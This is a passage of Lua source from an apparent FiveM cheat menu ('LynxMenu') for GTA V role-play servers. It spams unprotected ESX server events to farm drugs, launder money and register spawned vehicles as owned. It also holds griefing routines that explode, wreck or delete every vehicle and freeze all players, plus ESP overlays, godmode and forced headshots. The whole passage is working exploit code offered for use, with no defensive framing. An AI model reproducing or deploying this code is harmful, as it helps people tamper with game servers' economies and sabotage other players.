function sweed() TriggerServerEvent("esx_drugs:startSellWeed") TriggerServerEvent("esx_drugs:startSellWeed") TriggerServerEvent("esx_drugs:startSellWeed") TriggerServerEvent("esx_drugs:startSellWeed") TriggerServerEvent("esx_drugs:startSellWeed") end;

function hcoke() TriggerServerEvent("esx_drugs:startHarvestCoke") TriggerServerEvent("esx_drugs:startHarvestCoke") TriggerServerEvent("esx_drugs:startHarvestCoke") TriggerServerEvent("esx_drugs:startHarvestCoke") TriggerServerEvent("esx_drugs:startHarvestCoke") end;

function tcoke() TriggerServerEvent("esx_drugs:startTransformCoke") TriggerServerEvent("esx_drugs:startTransformCoke") TriggerServerEvent("esx_drugs:startTransformCoke") TriggerServerEvent("esx_drugs:startTransformCoke") TriggerServerEvent("esx_drugs:startTransformCoke") end;

function scoke() TriggerServerEvent("esx_drugs:startSellCoke") TriggerServerEvent("esx_drugs:startSellCoke") TriggerServerEvent("esx_drugs:startSellCoke") TriggerServerEvent("esx_drugs:startSellCoke") TriggerServerEvent("esx_drugs:startSellCoke") end;

function hmeth() TriggerServerEvent("esx_drugs:startHarvestMeth") TriggerServerEvent("esx_drugs:startHarvestMeth") TriggerServerEvent("esx_drugs:startHarvestMeth") TriggerServerEvent("esx_drugs:startHarvestMeth") TriggerServerEvent("esx_drugs:startHarvestMeth") end;

function tmeth() TriggerServerEvent("esx_drugs:startTransformMeth") TriggerServerEvent("esx_drugs:startTransformMeth") TriggerServerEvent("esx_drugs:startTransformMeth") TriggerServerEvent("esx_drugs:startTransformMeth") TriggerServerEvent("esx_drugs:startTransformMeth") end;

function smeth() TriggerServerEvent("esx_drugs:startSellMeth") TriggerServerEvent("esx_drugs:startSellMeth") TriggerServerEvent("esx_drugs:startSellMeth") TriggerServerEvent("esx_drugs:startSellMeth") TriggerServerEvent("esx_drugs:startSellMeth") end;

function hopi() TriggerServerEvent("esx_drugs:startHarvestOpium") TriggerServerEvent("esx_drugs:startHarvestOpium") TriggerServerEvent("esx_drugs:startHarvestOpium") TriggerServerEvent("esx_drugs:startHarvestOpium") TriggerServerEvent("esx_drugs:startHarvestOpium") end;

function topi() TriggerServerEvent("esx_drugs:startTransformOpium") TriggerServerEvent("esx_drugs:startTransformOpium") TriggerServerEvent("esx_drugs:startTransformOpium") TriggerServerEvent("esx_drugs:startTransformOpium") TriggerServerEvent("esx_drugs:startTransformOpium") end;

function sopi() TriggerServerEvent("esx_drugs:startSellOpium") TriggerServerEvent("esx_drugs:startSellOpium") TriggerServerEvent("esx_drugs:startSellOpium") TriggerServerEvent("esx_drugs:startSellOpium") TriggerServerEvent("esx_drugs:startSellOpium") end;

function mataaspalarufe() TriggerServerEvent("esx_blanchisseur:startWhitening", 85) TriggerServerEvent("esx_blanchisseur:startWhitening", 85) TriggerServerEvent("esx_blanchisseur:startWhitening", 85) TriggerServerEvent("esx_blanchisseur:startWhitening", 85) TriggerServerEvent("esx_blanchisseur:startWhitening", 85) TriggerServerEvent("esx_blanchisseur:startWhitening", 85) TriggerServerEvent("esx_blanchisseur:startWhitening", 85) TriggerServerEvent("esx_blanchisseur:startWhitening", 85) TriggerServerEvent("esx_blanchisseur:startWhitening", 85) TriggerServerEvent("esx_blanchisseur:startWhitening", 85) end;

function matanumaispalarufe() TriggerServerEvent("esx_drugs:stopHarvestCoke") TriggerServerEvent("esx_drugs:stopTransformCoke") TriggerServerEvent("esx_drugs:stopSellCoke") TriggerServerEvent("esx_drugs:stopHarvestMeth") TriggerServerEvent("esx_drugs:stopTransformMeth") TriggerServerEvent("esx_drugs:stopSellMeth") TriggerServerEvent("esx_drugs:stopHarvestWeed") TriggerServerEvent("esx_drugs:stopTransformWeed") TriggerServerEvent("esx_drugs:stopSellWeed") TriggerServerEvent("esx_drugs:stopHarvestOpium") TriggerServerEvent("esx_drugs:stopTransformOpium") TriggerServerEvent("esx_drugs:stopSellOpium") drawNotification("~r~Everything is now stopped.") end;
local
function cs() local c8 = KeyboardInput("Enter Vehicle Spawn Name", "", 100) local ct = KeyboardInput("Enter Vehicle Licence Plate", "", 100) if c8 and IsModelValid(c8) and IsModelAVehicle(c8) then RequestModel(c8) while not HasModelLoaded(c8) do Citizen.Wait(0) end;
    local veh = CreateVehicle(GetHashKey(c8), GetEntityCoords(PlayerPedId(-1)), GetEntityHeading(PlayerPedId(-1)), true, true) SetVehicleNumberPlateText(veh, ct) local cu = ESX.Game.GetVehicleProperties(veh) TriggerServerEvent("esx_vehicleshop:setVehicleOwned", cu) drawNotification("~g~~h~Success")
else drawNotification("~r~~h~Model is not valid !") end end;

function daojosdinpatpemata() local aq = GetPlayerPed(-1) local ar = GetVehiclePedIsIn(aq, true) if IsPedInAnyVehicle(GetPlayerPed(-1), 0) and GetPedInVehicleSeat(GetVehiclePedIsIn(GetPlayerPed(-1), 0), -1) == GetPlayerPed(-1) then SetVehicleOnGroundProperly(ar) drawNotification("~g~Vehicle Flipped!")
else drawNotification("~r~You Aren't In The Driverseat Of A Vehicle!") end end;

function stringsplit(cv, cw) if cw == nil then cw = "%s"
end;
local cx = {}
i = 1;
for cy in string.gmatch(cv, "([^"..cw..
        "]+)") do cx[i] = cy;
    i = i + 1 end;
return cx end;
local cz = false;

function SpectatePlayer(cA) local aq = PlayerPedId(-1) cz = not cz;
local cB = GetPlayerPed(cA) if cz then local cC, cD, cE = table.unpack(GetEntityCoords(cB, false)) RequestCollisionAtCoord(cC, cD, cE) NetworkSetInSpectatorMode(true, cB) drawNotification("Spectating "..GetPlayerName(cA))
else local cC, cD, cE = table.unpack(GetEntityCoords(cB, false)) RequestCollisionAtCoord(cC, cD, cE) NetworkSetInSpectatorMode(false, cB) drawNotification("Stopped Spectating "..GetPlayerName(cA)) end end;

function ShootPlayer(cA) local cF = GetPedBoneCoords(cA, GetEntityBoneIndexByName(cA, "SKEL_HEAD"), 0.0, 0.0, 0.0) SetPedShootsAtCoord(PlayerPedId(-1), cF.x, cF.y, cF.z, true) end;

function MaxOut(veh) SetVehicleModKit(GetVehiclePedIsIn(GetPlayerPed(-1), false), 0) SetVehicleWheelType(GetVehiclePedIsIn(GetPlayerPed(-1), false), 7) SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 0, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 0) - 1, false) SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 1, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 1) - 1, false) SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 2, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 2) - 1, false) SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 3, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 3) - 1, false) SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 4, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 4) - 1, false) SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 5, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 5) - 1, false) SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 6, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 6) - 1, false) SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 7, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 7) - 1, false) SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 8, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 8) - 1, false) SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 9, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 9) - 1, false) SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 10, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 10) - 1, false) SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 11, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 11) - 1, false) SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 12, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 12) - 1, false) SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 13, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 13) - 1, false) SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 14, 16, false) SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 15, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 15) - 2, false) SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 16, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 16) - 1, false) ToggleVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 17, true) ToggleVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 18, true) ToggleVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 19, true) ToggleVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 20, true) ToggleVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 21, true) ToggleVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 22, true) SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 23, 1, false) SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 24, 1, false) SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 25, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 25) - 1, false) SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 27, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 27) - 1, false) SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 28, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 28) - 1, false) SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 30, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 30) - 1, false) SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 33, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 33) - 1, false) SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 34, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 34) - 1, false) SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 35, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 35) - 1, false) SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 38, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 38) - 1, true) SetVehicleWindowTint(GetVehiclePedIsIn(GetPlayerPed(-1), false), 1) SetVehicleTyresCanBurst(GetVehiclePedIsIn(GetPlayerPed(-1), false), false) SetVehicleNumberPlateTextIndex(GetVehiclePedIsIn(GetPlayerPed(-1), false), 5) end;

function DelVeh(veh) SetEntityAsMissionEntity(Object, 1, 1) DeleteEntity(Object) SetEntityAsMissionEntity(GetVehiclePedIsIn(GetPlayerPed(-1), false), 1, 1) DeleteEntity(GetVehiclePedIsIn(GetPlayerPed(-1), false)) end;

function Clean(veh) SetVehicleDirtLevel(veh, 15.0) end;

function Clean2(veh) SetVehicleDirtLevel(veh, 1.0) end;

function RequestControl(entity) local cG = 0;
NetworkRequestControlOfEntity(entity) while not NetworkHasControlOfEntity(entity) do cG = cG + 100;
    Citizen.Wait(100) if cG > 5000 then drawNotification("Hung for 5 seconds, killing to prevent issues...") end end end;

function getEntity(cA) local e, entity = GetEntityPlayerIsFreeAimingAt(cA, Citizen.ReturnResultAnyway()) return entity end;

function GetInputMode() return Citizen.InvokeNative(0xA571D46727E2B718, 2) and "MouseAndKeyboard"
or "GamePad"
end;

function DrawSpecialText(cH, cI) SetTextEntry_2("STRING") AddTextComponentString(cH) DrawSubtitleTimed(cI, 1) end;
local cJ = true;
local cK = false;
local cL = true;
Citizen.CreateThread(function() while true do Wait(1) for E = 0, 128 do
        if NetworkIsPlayerActive(E)
    and GetPlayerPed(E)  ~= GetPlayerPed(-1) then ped = GetPlayerPed(E) blip = GetBlipFromEntity(ped) x1, y1, z1 = table.unpack(GetEntityCoords(GetPlayerPed(-1), true)) x2, y2, z2 = table.unpack(GetEntityCoords(GetPlayerPed(E), true)) distance = math.floor(GetDistanceBetweenCoords(x1, y1, z1, x2, y2, z2, true)) headId = Citizen.InvokeNative(0xBFEFE3321A3F5015, ped, GetPlayerName(E), false, false, "", false) wantedLvl = GetPlayerWantedLevel(E) if cK then Citizen.InvokeNative(0x63BB75ABEDC1F6A0, headId, 0, true) if wantedLvl then Citizen.InvokeNative(0x63BB75ABEDC1F6A0, headId, 7, true) Citizen.InvokeNative(0xCF228E2AA03099C3, headId, wantedLvl)
    else Citizen.InvokeNative(0x63BB75ABEDC1F6A0, headId, 7, false) end
    else Citizen.InvokeNative(0x63BB75ABEDC1F6A0, headId, 7, false) Citizen.InvokeNative(0x63BB75ABEDC1F6A0, headId, 9, false) Citizen.InvokeNative(0x63BB75ABEDC1F6A0, headId, 0, false) end;
    if cJ then
    if not DoesBlipExist(blip) then blip = AddBlipForEntity(ped) SetBlipSprite(blip, 1) Citizen.InvokeNative(0x5FBCA48327B914DF, blip, true) SetBlipNameToPlayerName(blip, E)
    else veh = GetVehiclePedIsIn(ped, false) blipSprite = GetBlipSprite(blip) if not GetEntityHealth(ped) then
    if blipSprite ~= 274 then SetBlipSprite(blip, 274) Citizen.InvokeNative(0x5FBCA48327B914DF, blip, false) SetBlipNameToPlayerName(blip, E) end elseif veh then vehClass = GetVehicleClass(veh) vehModel = GetEntityModel(veh) if vehClass == 15 then
    if blipSprite ~= 422 then SetBlipSprite(blip, 422) Citizen.InvokeNative(0x5FBCA48327B914DF, blip, false) SetBlipNameToPlayerName(blip, E) end elseif vehClass == 16 then
    if vehModel == GetHashKey("besra") or vehModel == GetHashKey("hydra") or vehModel == GetHashKey("lazer") then
    if blipSprite ~= 424 then SetBlipSprite(blip, 424) Citizen.InvokeNative(0x5FBCA48327B914DF, blip, false) SetBlipNameToPlayerName(blip, E) end elseif blipSprite ~= 423 then SetBlipSprite(blip, 423) Citizen.InvokeNative(0x5FBCA48327B914DF, blip, false) end elseif vehClass == 14 then
    if blipSprite ~= 427 then SetBlipSprite(blip, 427) Citizen.InvokeNative(0x5FBCA48327B914DF, blip, false) end elseif vehModel == GetHashKey("insurgent") or vehModel == GetHashKey("insurgent2") or vehModel == GetHashKey("limo2") then
    if blipSprite ~= 426 then SetBlipSprite(blip, 426) Citizen.InvokeNative(0x5FBCA48327B914DF, blip, false) SetBlipNameToPlayerName(blip, E) end elseif vehModel == GetHashKey("rhino") then
    if blipSprite ~= 421 then SetBlipSprite(blip, 421) Citizen.InvokeNative(0x5FBCA48327B914DF, blip, false) SetBlipNameToPlayerName(blip, E) end elseif blipSprite ~= 1 then SetBlipSprite(blip, 1) Citizen.InvokeNative(0x5FBCA48327B914DF, blip, true) SetBlipNameToPlayerName(blip, E) end; passengers = GetVehicleNumberOfPassengers(veh) if passengers then
    if not IsVehicleSeatFree(veh, -1) then passengers = passengers + 1 end; ShowNumberOnBlip(blip, passengers)
    else HideNumberOnBlip(blip) end
    else HideNumberOnBlip(blip) if blipSprite ~= 1 then SetBlipSprite(blip, 1) Citizen.InvokeNative(0x5FBCA48327B914DF, blip, true) SetBlipNameToPlayerName(blip, E) end end; SetBlipRotation(blip, math.ceil(GetEntityHeading(veh))) SetBlipNameToPlayerName(blip, E) SetBlipScale(blip, 0.85) if IsPauseMenuActive() then SetBlipAlpha(blip, 255)
    else x1, y1 = table.unpack(GetEntityCoords(GetPlayerPed(-1), true)) x2, y2 = table.unpack(GetEntityCoords(GetPlayerPed(E), true)) distance = math.floor(math.abs(math.sqrt((x1 - x2) * (x1 - x2) + (y1 - y2) * (y1 - y2))) / -1) + 900;
    if distance < 0 then distance = 0 elseif distance > 255 then distance = 255 end; SetBlipAlpha(blip, distance) end end
    else RemoveBlip(blip) end end end end end) local cM = {
    __gc = function(cN) if cN.destructor and cN.handle then cN.destructor(cN.handle) end;
    cN.destructor = nil;
    cN.handle = nil end
}

function EnumerateEntities(cO, cP, cQ) return coroutine.wrap(function() local cR, E = cO() if not E or E == 0 then cQ(cR) return end; local cN = {
        handle = cR, destructor = cQ
    }
    setmetatable(cN, cM) local cS = true; repeat coroutine.yield(E) cS, E = cP(cR) until not cS; cN.destructor, cN.handle = nil, nil; cQ(cR) end) end;

function EnumeratePeds() return EnumerateEntities(FindFirstPed, FindNextPed, EndFindPed) end;

function EnumerateVehicles() return EnumerateEntities(FindFirstVehicle, FindNextVehicle, EndFindVehicle) end;

function EnumerateObjects() return EnumerateEntities(FindFirstObject, FindNextObject, EndFindObject) end;

function RotationToDirection(cT) local cU = cT.z * 0.0174532924;
local cV = cT.x * 0.0174532924;
local cW = math.abs(math.cos(cV)) return vector3(-math.sin(cU) * cW, math.cos(cU) * cW, math.sin(cV)) end;

function OscillateEntity(entity, cX, cY, cZ, c_) if entity ~= 0 and entity ~= nil then local d0 = (cY - cX) * cZ * cZ - 2.0 * cZ * c_ * GetEntityVelocity(entity) ApplyForceToEntity(entity, 3, d0.x, d0.y, d0.z + 0.1, 0.0, 0.0, 0.0, false, false, true, true, false, true) end end;
local d1 = true;
Citizen.CreateThread(function() while bl do Citizen.Wait(0) SetPlayerInvincible(PlayerId(), Godmode) SetEntityInvincible(PlayerPedId(-1), Godmode) SetEntityVisible(GetPlayerPed(-1), d1, 0) if SuperJump
    then SetSuperJumpThisFrame(PlayerId(-1)) end;
    if InfStamina then RestorePlayerStamina(PlayerId(-1), 1.0) end;
    if fastrun then SetRunSprintMultiplierForPlayer(PlayerId(-1), 2.49) SetPedMoveRateOverride(GetPlayerPed(-1), 2.15)
    else SetRunSprintMultiplierForPlayer(PlayerId(-1), 1.0) SetPedMoveRateOverride(GetPlayerPed(-1), 1.0) end;
    if VehicleGun then local d2 = "Freight"
    local bY = GetEntityCoords(GetPlayerPed(-1), true) if IsPedInAnyVehicle(GetPlayerPed(-1), true) == false then drawNotification("~g~Vehicle Gun Enabled!~n~~w~Use The ~b~AP Pistol~n~~b~Aim ~w~and ~b~Shoot!") GiveWeaponToPed(GetPlayerPed(-1), GetHashKey("WEAPON_APPISTOL"), 999999, false, true) SetPedAmmo(GetPlayerPed(-1), GetHashKey("WEAPON_APPISTOL"), 999999) if GetSelectedPedWeapon(GetPlayerPed(-1)) == GetHashKey("WEAPON_APPISTOL") then
    if IsPedShooting(GetPlayerPed(-1)) then
    while not HasModelLoaded(GetHashKey(d2)) do Citizen.Wait(0) RequestModel(GetHashKey(d2)) end;
    local veh = CreateVehicle(GetHashKey(d2), bY.x + 5 * GetEntityForwardX(GetPlayerPed(-1)), bY.y + 5 * GetEntityForwardY(GetPlayerPed(-1)), bY.z + 2.0, GetEntityHeading(GetPlayerPed(-1)), true, true) SetEntityAsNoLongerNeeded(veh) SetVehicleForwardSpeed(veh, 150.0) end end end end;
    if DeleteGun then local d3 = getEntity(PlayerId(-1)) if IsPedInAnyVehicle(GetPlayerPed(-1), true) == false then drawNotification("~g~Delete Gun Enabled!~n~~w~Use The ~b~Pistol~n~~b~Aim ~w~and ~b~Shoot ~w~To Delete!") GiveWeaponToPed(GetPlayerPed(-1), GetHashKey("WEAPON_PISTOL"), 999999, false, true) SetPedAmmo(GetPlayerPed(-1), GetHashKey("WEAPON_PISTOL"), 999999) if GetSelectedPedWeapon(GetPlayerPed(-1)) == GetHashKey("WEAPON_PISTOL") then
    if IsPlayerFreeAiming(PlayerId(-1)) then
    if IsEntityAPed(d3) then
    if IsPedInAnyVehicle(d3, true) then
    if IsControlJustReleased(1, 142) then SetEntityAsMissionEntity(GetVehiclePedIsIn(d3, true), 1, 1) DeleteEntity(GetVehiclePedIsIn(d3, true)) SetEntityAsMissionEntity(d3, 1, 1) DeleteEntity(d3) drawNotification("~g~Deleted!") end
    else if IsControlJustReleased(1, 142) then SetEntityAsMissionEntity(d3, 1, 1) DeleteEntity(d3) drawNotification("~g~Deleted!") end end
    else if IsControlJustReleased(1, 142) then SetEntityAsMissionEntity(d3, 1, 1) DeleteEntity(d3) drawNotification("~g~Deleted!") end end end end end end;
    if fuckallcars then
    for ar in EnumerateVehicles() do
        if not
    IsPedAPlayer(GetPedInVehicleSeat(ar, -1)) then SetVehicleHasBeenOwnedByPlayer(ar, false) SetEntityAsMissionEntity(ar, false, false) StartVehicleAlarm(ar) DetachVehicleWindscreen(ar) SmashVehicleWindow(ar, 0) SmashVehicleWindow(ar, 1) SmashVehicleWindow(ar, 2) SmashVehicleWindow(ar, 3) SetVehicleTyreBurst(ar, 0, true, 1000.0) SetVehicleTyreBurst(ar, 1, true, 1000.0) SetVehicleTyreBurst(ar, 2, true, 1000.0) SetVehicleTyreBurst(ar, 3, true, 1000.0) SetVehicleTyreBurst(ar, 4, true, 1000.0) SetVehicleTyreBurst(ar, 5, true, 1000.0) SetVehicleTyreBurst(ar, 4, true, 1000.0) SetVehicleTyreBurst(ar, 7, true, 1000.0) SetVehicleDoorBroken(ar, 0, true) SetVehicleDoorBroken(ar, 1, true) SetVehicleDoorBroken(ar, 2, true) SetVehicleDoorBroken(ar, 3, true) SetVehicleDoorBroken(ar, 4, true) SetVehicleDoorBroken(ar, 5, true) SetVehicleDoorBroken(ar, 6, true) SetVehicleDoorBroken(ar, 7, true) SetVehicleLights(ar, 1) Citizen.InvokeNative(0x1FD09E7390A74D54, ar, 1) SetVehicleNumberPlateTextIndex(ar, 5) SetVehicleNumberPlateText(ar, "LynxMenu") SetVehicleDirtLevel(ar, 10.0) SetVehicleModColor_1(ar, 1) SetVehicleModColor_2(ar, 1) SetVehicleCustomPrimaryColour(ar, 255, 51, 255) SetVehicleCustomSecondaryColour(ar, 255, 51, 255) SetVehicleBurnout(ar, true) end end end;
    if destroyvehicles then
    for vehicle in EnumerateVehicles() do
        if vehicle ~=
    GetVehiclePedIsIn(GetPlayerPed(-1), false) then NetworkRequestControlOfEntity(vehicle) SetVehicleUndriveable(vehicle, true) SetVehicleEngineHealth(vehicle, 0) end end end;
    if explodevehicles then
    for vehicle in EnumerateVehicles() do
        if vehicle ~=
    GetVehiclePedIsIn(GetPlayerPed(-1), false) then NetworkRequestControlOfEntity(vehicle) NetworkExplodeVehicle(vehicle, true, true, false) end end end;
    if deletenearestvehicle then
    for vehicle in EnumerateVehicles() do
        if vehicle ~=
    GetVehiclePedIsIn(GetPlayerPed(-1), false) then SetEntityAsMissionEntity(GetVehiclePedIsIn(vehicle, true), 1, 1) DeleteEntity(GetVehiclePedIsIn(vehicle, true)) SetEntityAsMissionEntity(vehicle, 1, 1) DeleteEntity(vehicle) end end end;
    if freezeplayer then ClearPedTasksImmediately(GetPlayerPed(SelectedPlayer)) end;
    if freezeall then
    for i = 0, 128 do ClearPedTasksImmediately(GetPlayerPed(i)) end end;
    if esp then
    for i = 0, 128 do
        if i ~=
    PlayerId(-1) and GetPlayerServerId(i)  ~= 0 then local a3 = c(1.0) local d4 = GetPlayerPed(i) local d5, d6, d7 = table.unpack(GetEntityCoords(PlayerPedId(-1))) local x, y, z = table.unpack(GetEntityCoords(d4)) local d8 = "~h~Name: "..GetPlayerName(i)..
    "\nServer ID: "..GetPlayerServerId(i)..
    "\nPlayer ID: "..i..
    "\nDist: "..math.round(GetDistanceBetweenCoords(d5, d6, d7, x, y, z, true), 1) if IsPedInAnyVehicle(d4, true) then local d9 = GetLabelText(GetDisplayNameFromVehicleModel(GetEntityModel(GetVehiclePedIsUsing(d4)))) d8 = d8..
    "\nVeh: "..d9 end;
    if espinfo and esp then DrawText3D(x, y, z - 1.0, d8, a3.r, a3.g, a3.b) end;
    if espbox and esp then LineOneBegin = GetOffsetFromEntityInWorldCoords(d4, -0.3, -0.3, -0.9) LineOneEnd = GetOffsetFromEntityInWorldCoords(d4, 0.3, -0.3, -0.9) LineTwoBegin = GetOffsetFromEntityInWorldCoords(d4, 0.3, -0.3, -0.9) LineTwoEnd = GetOffsetFromEntityInWorldCoords(d4, 0.3, 0.3, -0.9) LineThreeBegin = GetOffsetFromEntityInWorldCoords(d4, 0.3, 0.3, -0.9) LineThreeEnd = GetOffsetFromEntityInWorldCoords(d4, -0.3, 0.3, -0.9) LineFourBegin = GetOffsetFromEntityInWorldCoords(d4, -0.3, -0.3, -0.9) TLineOneBegin = GetOffsetFromEntityInWorldCoords(d4, -0.3, -0.3, 0.8) TLineOneEnd = GetOffsetFromEntityInWorldCoords(d4, 0.3, -0.3, 0.8) TLineTwoBegin = GetOffsetFromEntityInWorldCoords(d4, 0.3, -0.3, 0.8) TLineTwoEnd = GetOffsetFromEntityInWorldCoords(d4, 0.3, 0.3, 0.8) TLineThreeBegin = GetOffsetFromEntityInWorldCoords(d4, 0.3, 0.3, 0.8) TLineThreeEnd = GetOffsetFromEntityInWorldCoords(d4, -0.3, 0.3, 0.8) TLineFourBegin = GetOffsetFromEntityInWorldCoords(d4, -0.3, -0.3, 0.8) ConnectorOneBegin = GetOffsetFromEntityInWorldCoords(d4, -0.3, 0.3, 0.8) ConnectorOneEnd = GetOffsetFromEntityInWorldCoords(d4, -0.3, 0.3, -0.9) ConnectorTwoBegin = GetOffsetFromEntityInWorldCoords(d4, 0.3, 0.3, 0.8) ConnectorTwoEnd = GetOffsetFromEntityInWorldCoords(d4, 0.3, 0.3, -0.9) ConnectorThreeBegin = GetOffsetFromEntityInWorldCoords(d4, -0.3, -0.3, 0.8) ConnectorThreeEnd = GetOffsetFromEntityInWorldCoords(d4, -0.3, -0.3, -0.9) ConnectorFourBegin = GetOffsetFromEntityInWorldCoords(d4, 0.3, -0.3, 0.8) ConnectorFourEnd = GetOffsetFromEntityInWorldCoords(d4, 0.3, -0.3, -0.9) DrawLine(LineOneBegin.x, LineOneBegin.y, LineOneBegin.z, LineOneEnd.x, LineOneEnd.y, LineOneEnd.z, a3.r, a3.g, a3.b, 255) DrawLine(LineTwoBegin.x, LineTwoBegin.y, LineTwoBegin.z, LineTwoEnd.x, LineTwoEnd.y, LineTwoEnd.z, a3.r, a3.g, a3.b, 255) DrawLine(LineThreeBegin.x, LineThreeBegin.y, LineThreeBegin.z, LineThreeEnd.x, LineThreeEnd.y, LineThreeEnd.z, a3.r, a3.g, a3.b, 255) DrawLine(LineThreeEnd.x, LineThreeEnd.y, LineThreeEnd.z, LineFourBegin.x, LineFourBegin.y, LineFourBegin.z, a3.r, a3.g, a3.b, 255) DrawLine(TLineOneBegin.x, TLineOneBegin.y, TLineOneBegin.z, TLineOneEnd.x, TLineOneEnd.y, TLineOneEnd.z, a3.r, a3.g, a3.b, 255) DrawLine(TLineTwoBegin.x, TLineTwoBegin.y, TLineTwoBegin.z, TLineTwoEnd.x, TLineTwoEnd.y, TLineTwoEnd.z, a3.r, a3.g, a3.b, 255) DrawLine(TLineThreeBegin.x, TLineThreeBegin.y, TLineThreeBegin.z, TLineThreeEnd.x, TLineThreeEnd.y, TLineThreeEnd.z, a3.r, a3.g, a3.b, 255) DrawLine(TLineThreeEnd.x, TLineThreeEnd.y, TLineThreeEnd.z, TLineFourBegin.x, TLineFourBegin.y, TLineFourBegin.z, a3.r, a3.g, a3.b, 255) DrawLine(ConnectorOneBegin.x, ConnectorOneBegin.y, ConnectorOneBegin.z, ConnectorOneEnd.x, ConnectorOneEnd.y, ConnectorOneEnd.z, a3.r, a3.g, a3.b, 255) DrawLine(ConnectorTwoBegin.x, ConnectorTwoBegin.y, ConnectorTwoBegin.z, ConnectorTwoEnd.x, ConnectorTwoEnd.y, ConnectorTwoEnd.z, a3.r, a3.g, a3.b, 255) DrawLine(ConnectorThreeBegin.x, ConnectorThreeBegin.y, ConnectorThreeBegin.z, ConnectorThreeEnd.x, ConnectorThreeEnd.y, ConnectorThreeEnd.z, a3.r, a3.g, a3.b, 255) DrawLine(ConnectorFourBegin.x, ConnectorFourBegin.y, ConnectorFourBegin.z, ConnectorFourEnd.x, ConnectorFourEnd.y, ConnectorFourEnd.z, a3.r, a3.g, a3.b, 255) end;
    if esplines and esp then DrawLine(d5, d6, d7, x, y, z, a3.r, a3.g, a3.b, 255) end end end end;
    if VehGod and IsPedInAnyVehicle(PlayerPedId(-1), true) then SetEntityInvincible(GetVehiclePedIsUsing(PlayerPedId(-1)), true) end;
    if oneshot then SetPlayerWeaponDamageModifier(PlayerId(-1), 100.0) local d3 = getEntity(PlayerId(-1)) if IsEntityAPed(d3) then
    if IsPedInAnyVehicle(d3, true) then
    if IsPedInAnyVehicle(GetPlayerPed(-1), true) then
    if IsControlJustReleased(1, 69) then NetworkExplodeVehicle(GetVehiclePedIsIn(d3, true), true, true, 0) end
    else if IsControlJustReleased(1, 142) then NetworkExplodeVehicle(GetVehiclePedIsIn(d3, true), true, true, 0) end end end elseif IsEntityAVehicle(d3) then
    if IsPedInAnyVehicle(GetPlayerPed(-1), true) then
    if IsControlJustReleased(1, 69) then NetworkExplodeVehicle(d3, true, true, 0) end
    else if IsControlJustReleased(1, 142) then NetworkExplodeVehicle(d3, true, true, 0) end end end
    else SetPlayerWeaponDamageModifier(PlayerId(-1), 1.0) end;
